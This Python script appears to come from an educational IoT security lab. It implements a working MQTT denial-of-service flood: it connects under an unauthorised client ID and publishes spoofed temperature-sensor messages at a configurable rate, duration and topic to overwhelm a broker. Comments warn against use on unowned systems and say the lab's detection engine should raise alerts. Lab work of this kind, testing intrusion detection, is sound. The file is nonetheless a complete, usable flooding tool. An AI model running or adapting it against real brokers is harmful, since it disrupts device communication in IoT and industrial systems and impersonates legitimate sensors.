# =============================================================================
# attacks/dos_flood.py — MQTT Denial of Service (DoS) Flood Attack
# =============================================================================
# EDUCATIONAL PURPOSE ONLY — Do NOT run this against systems you don't own.
#
# This script simulates an MQTT flood attack where an attacker rapidly
# publishes thousands of messages to overwhelm the broker and prevent
# legitimate IoT devices from communicating.
#
# Real-world context:
#   The Mirai botnet (2016) used compromised IoT devices to flood targets.
#   MQTT brokers without rate limiting are vulnerable to this exact attack.
#
# MITRE ATT&CK ICS: T0814 - Denial of Service
# =============================================================================

import paho.mqtt.client as mqtt
import json
import time
import sys
import os
import argparse     # For command-line arguments (flood speed, duration, etc.)

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import config

# ── ATTACK CONFIGURATION ─────────────────────────────────────────────────────
# These defaults can be overridden via command-line arguments

DEFAULT_MESSAGES_PER_SECOND = 50    # Flood rate (way above normal threshold of 20)
DEFAULT_DURATION_SECONDS    = 30    # How long to run the attack
DEFAULT_TARGET_TOPIC        = "lab/sensors/temperature"  # Topic to flood

# The attacker's client ID — NOT in the authorised device list
ATTACKER_CLIENT_ID = "attacker-dos-001"


# ─────────────────────────────────────────────────────────────────────────────
# FUNCTION: print_banner
# Shows a clear warning and attack context before starting.
# ─────────────────────────────────────────────────────────────────────────────
def print_banner(rate, duration, topic):
    print("\n" + "=" * 60)
    print("  ⚡ MQTT DoS FLOOD ATTACK SIMULATION")
    print("=" * 60)
    print(f"  Target Broker : {config.BROKER_HOST}:{config.BROKER_PORT}")
    print(f"  Target Topic  : {topic}")
    print(f"  Flood Rate    : {rate} messages/second")
    print(f"  Duration      : {duration} seconds")
    print(f"  Total Messages: ~{rate * duration}")
    print(f"  Attacker ID   : {ATTACKER_CLIENT_ID}")
    print("=" * 60)
    print("  ⚠️  This will trigger HIGH severity alerts in the monitor")
    print("  📚 Educational use only — do not use on real systems")
    print("=" * 60 + "\n")


# ─────────────────────────────────────────────────────────────────────────────
# FUNCTION: build_flood_payload
# Creates a fake "sensor" payload — looks legitimate but comes from attacker.
# The detection engine will catch this via rate analysis + unknown client ID.
# ─────────────────────────────────────────────────────────────────────────────
def build_flood_payload(sequence_number):
    return json.dumps({
        "device_id":   ATTACKER_CLIENT_ID,
        "device_type": "temperature_sensor",    # Pretending to be a sensor
        "temperature": 99.9,                     # Suspicious out-of-range value
        "seq":         sequence_number,          # Track how many we've sent
        "timestamp":   time.time()
    })


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print(f"[DoS Attack] ✅ Connected to broker — attack commencing!")
    else:
        print(f"[DoS Attack] ❌ Failed to connect (code {rc})")
        sys.exit(1)


# ─────────────────────────────────────────────────────────────────────────────
# FUNCTION: run_attack
# Core attack loop — publishes messages as fast as specified.
# ─────────────────────────────────────────────────────────────────────────────
def run_attack(rate, duration, topic):
    client = mqtt.Client(client_id=ATTACKER_CLIENT_ID)
    client.on_connect = on_connect

    try:
        client.connect(config.BROKER_HOST, config.BROKER_PORT, config.BROKER_KEEPALIVE)
    except ConnectionRefusedError:
        print("[DoS Attack] ❌ Broker not reachable.")
        sys.exit(1)

    client.loop_start()
    time.sleep(0.5)     # Small wait for connection to establish

    # Calculate delay between messages to achieve desired rate
    # e.g., 50 msgs/sec means 1/50 = 0.02 seconds between each message
    delay = 1.0 / rate if rate > 0 else 0

    start_time   = time.time()
    message_count = 0
    last_report  = start_time

    print(f"[DoS Attack] 🔥 FLOODING: {rate} msgs/sec for {duration}s...\n")

    try:
        while True:
            elapsed = time.time() - start_time

            # Stop after specified duration
            if elapsed >= duration:
                break

            # Build and publish a flood message
            payload = build_flood_payload(message_count)
            client.publish(topic, payload, qos=0)   # QoS 0 for max speed
            message_count += 1

            # ── PROGRESS REPORT every 5 seconds ──────────────────────────
            if time.time() - last_report >= 5:
                actual_rate = message_count / elapsed if elapsed > 0 else 0
                remaining   = duration - elapsed
                print(f"[DoS Attack] 📊 Sent: {message_count:,} msgs | "
                      f"Rate: {actual_rate:.0f}/sec | "
                      f"Remaining: {remaining:.0f}s")
                last_report = time.time()

            # Throttle to target rate
            time.sleep(delay)

    except KeyboardInterrupt:
        print("\n[DoS Attack] ⏹  Attack interrupted by user")

    # ── ATTACK SUMMARY ────────────────────────────────────────────────────
    total_time    = time.time() - start_time
    actual_rate   = message_count / total_time if total_time > 0 else 0

    print("\n" + "=" * 50)
    print("  ⚡ ATTACK COMPLETE — SUMMARY")
    print("=" * 50)
    print(f"  Messages Sent : {message_count:,}")
    print(f"  Duration      : {total_time:.1f} seconds")
    print(f"  Actual Rate   : {actual_rate:.0f} msgs/second")
    print(f"  Expected Alerts: HIGH severity DoS detection")
    print("=" * 50)

    client.loop_stop()
    client.disconnect()


# ─────────────────────────────────────────────────────────────────────────────
# MAIN with argument parsing
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="MQTT DoS Flood Attack Simulator (Educational Only)"
    )
    parser.add_argument(
        "--rate", type=int, default=DEFAULT_MESSAGES_PER_SECOND,
        help=f"Messages per second (default: {DEFAULT_MESSAGES_PER_SECOND})"
    )
    parser.add_argument(
        "--duration", type=int, default=DEFAULT_DURATION_SECONDS,
        help=f"Attack duration in seconds (default: {DEFAULT_DURATION_SECONDS})"
    )
    parser.add_argument(
        "--topic", type=str, default=DEFAULT_TARGET_TOPIC,
        help=f"Target MQTT topic (default: {DEFAULT_TARGET_TOPIC})"
    )

    args = parser.parse_args()

    print_banner(args.rate, args.duration, args.topic)

    # Countdown before attack starts (gives you time to observe dashboard)
    print("[DoS Attack] Starting in 3 seconds... (Ctrl+C to cancel)")
    for i in range(3, 0, -1):
        print(f"             {i}...")
        time.sleep(1)

    run_attack(args.rate, args.duration, args.topic)


if __name__ == "__main__":
    main()
